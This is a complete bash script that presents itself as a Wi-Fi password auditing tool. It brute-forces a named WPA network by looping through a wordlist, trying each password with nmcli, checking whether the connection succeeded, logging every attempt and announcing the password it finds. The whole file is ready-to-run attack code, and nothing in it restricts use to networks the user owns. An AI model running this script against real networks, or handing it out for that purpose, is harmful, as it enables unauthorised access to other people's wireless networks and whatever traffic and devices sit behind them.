#!/bin/bash

# WiFi Password Auditing Tool - Enhanced Detection
# Usage: sudo ./wifi-bruteforce-enhanced.sh <SSID> <WORDLIST_FILE>

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Global variables
WIFI_INTERFACE=""
ETHERNET_INTERFACE=""
SSID=""
WORDLIST=""
LOG_FILE=""
FOUND=false
ORIGINAL_CONNECTION=""

cleanup() {
    echo -e "\n${YELLOW}Cleaning up...${NC}"
    killall dhclient 2>/dev/null
    if [ -n "$ORIGINAL_CONNECTION" ]; then
        nmcli connection up "$ORIGINAL_CONNECTION" 2>/dev/null
    fi
    nmcli radio wifi on
    systemctl restart NetworkManager 2>/dev/null
    exit 0
}

trap cleanup SIGINT SIGTERM

# Check requirements
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}Must run with sudo${NC}"
    exit 1
fi

if [ $# -lt 2 ]; then
    echo "Usage: sudo ./wifi-bruteforce-enhanced.sh <SSID> <WORDLIST>"
    exit 1
fi

SSID="$1"
WORDLIST="$2"

# Get interfaces
WIFI_INTERFACE=$(nmcli device status | awk '/wifi/ {print $1}' | head -1)
ETHERNET_INTERFACE=$(nmcli device status | awk '/ethernet/ {print $1}' | head -1)

# Save original connection
ORIGINAL_CONNECTION=$(nmcli -t -f NAME,DEVICE connection show --active | grep "$WIFI_INTERFACE" | cut -d: -f1)

# Count passwords
TOTAL_PASSWORDS=$(wc -l < "$WORDLIST")
ATTEMPT=0

# Log file
LOG_FILE="wifi-audit-$(date +%Y%m%d-%H%M%S).log"

echo -e "${YELLOW}================================${NC}"
echo -e "Target SSID: ${BLUE}$SSID${NC}"
echo -e "Interface: ${BLUE}$WIFI_INTERFACE${NC}"
echo -e "Passwords: ${BLUE}$TOTAL_PASSWORDS${NC}"
echo -e "Log file: ${BLUE}$LOG_FILE${NC}"
echo -e "${YELLOW}================================${NC}"

# Disable ethernet
if [ -n "$ETHERNET_INTERFACE" ]; then
    nmcli device disconnect "$ETHERNET_INTERFACE" &>/dev/null
fi

# Disconnect WiFi
nmcli device disconnect "$WIFI_INTERFACE" &>/dev/null
sleep 2

# Function to check connection using MULTIPLE methods
check_connection() {
    local results=()
    
    # Method 1: Check if interface has an IP
    local ip_addr=$(ip -4 addr show "$WIFI_INTERFACE" 2>/dev/null | grep -oP '(?<=inet\s)\d+\.\d+\.\d+\.\d+')
    
    # Method 2: Check iwgetid
    local current_ssid=$(iwgetid -r 2>/dev/null)
    
    # Method 3: Check nmcli device status
    local device_state=$(nmcli -f DEVICE,STATE device status | grep "^$WIFI_INTERFACE" | grep -o "connected")
    
    # Method 4: Check active connections (your method)
    local active_conn=$(nmcli -t -f NAME,DEVICE,TYPE connection show --active 2>/dev/null | grep -i "$SSID")
    
    # Method 5: Check if we can ping (optional)
    local ping_test="failed"
    if [ -n "$ip_addr" ]; then
        ping -c 1 -W 1 8.8.8.8 &>/dev/null && ping_test="success"
    fi
    
    # Log all methods
    echo "  CHECK: IP=$ip_addr, SSID='$current_ssid', STATE='$device_state', ACTIVE='$active_conn', PING=$ping_test" >> "$LOG_FILE"
    
    # Return success if ANY method indicates connection to target
    if [ "$current_ssid" = "$SSID" ] || [[ "$active_conn" == *"$SSID"* ]]; then
        if [ -n "$ip_addr" ]; then
            echo "$ip_addr"
            return 0
        fi
    fi
    
    return 1
}

# Main loop
while IFS= read -r PASSWORD || [ -n "$PASSWORD" ]; do
    PASSWORD=$(echo "$PASSWORD" | tr -d '\r' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
    [ -z "$PASSWORD" ] && continue
    
    ATTEMPT=$((ATTEMPT + 1))
    
    # Progress
    PERCENT=$((ATTEMPT * 100 / TOTAL_PASSWORDS))
    echo -ne "${BLUE}[${ATTEMPT}/${TOTAL_PASSWORDS} ${PERCENT}%]${NC} Trying: ${YELLOW}${PASSWORD}${NC}\r"
    
    # Log attempt
    echo "Attempt $ATTEMPT: $PASSWORD" >> "$LOG_FILE"
    
    # Disconnect first
    nmcli device disconnect "$WIFI_INTERFACE" &>/dev/null
    sleep 1
    
    # Try to connect - capture all output
    CONN_OUTPUT=$(nmcli device wifi connect "$SSID" password "$PASSWORD" ifname "$WIFI_INTERFACE" 2>&1)
    echo "  Connection output: $CONN_OUTPUT" >> "$LOG_FILE"
    
    # Wait and check connection status for up to 15 seconds
    CONNECTED=false
    for ((wait=1; wait<=15; wait++)); do
        sleep 1
        
        if check_connection > /tmp/ip_addr.$$; then
            IP_ADDR=$(cat /tmp/ip_addr.$$)
            CONNECTED=true
            break
        fi
        
        # Show waiting dots in log
        echo -n "." >> "$LOG_FILE"
    done
    echo "" >> "$LOG_FILE"
    rm -f /tmp/ip_addr.$$
    
    if [ "$CONNECTED" = true ]; then
        echo -e "\n${GREEN}=========================================${NC}"
        echo -e "${GREEN}SUCCESS! Password found!${NC}"
        echo -e "${GREEN}=========================================${NC}"
        echo -e "SSID: ${BLUE}$SSID${NC}"
        echo -e "Password: ${GREEN}$PASSWORD${NC}"
        echo -e "IP Address: ${BLUE}$IP_ADDR${NC}"
        echo -e "${GREEN}=========================================${NC}"
        
        echo "SUCCESS - Password found: $PASSWORD" >> "$LOG_FILE"
        
        # Show current connections
        echo ""
        echo "Current active connections:"
        nmcli connection show --active
        echo ""
        echo "Device status:"
        nmcli device status | grep "$WIFI_INTERFACE"
        
        FOUND=true
        break
    fi
    
done < "$WORDLIST"

# Summary
echo ""
echo ""
if [ "$FOUND" = true ]; then
    echo -e "${GREEN}Password found after $ATTEMPT attempts${NC}"
else
    echo -e "${RED}Password not found after $ATTEMPT attempts${NC}"
    
    # Restore original connection
    if [ -n "$ORIGINAL_CONNECTION" ]; then
        nmcli connection up "$ORIGINAL_CONNECTION" &>/dev/null
    fi
fi

# Re-enable ethernet
if [ -n "$ETHERNET_INTERFACE" ]; then
    nmcli device connect "$ETHERNET_INTERFACE" &>/dev/null
fi

echo -e "Log saved to: ${BLUE}$LOG_FILE${NC}"
trap - SIGINT SIGTERM
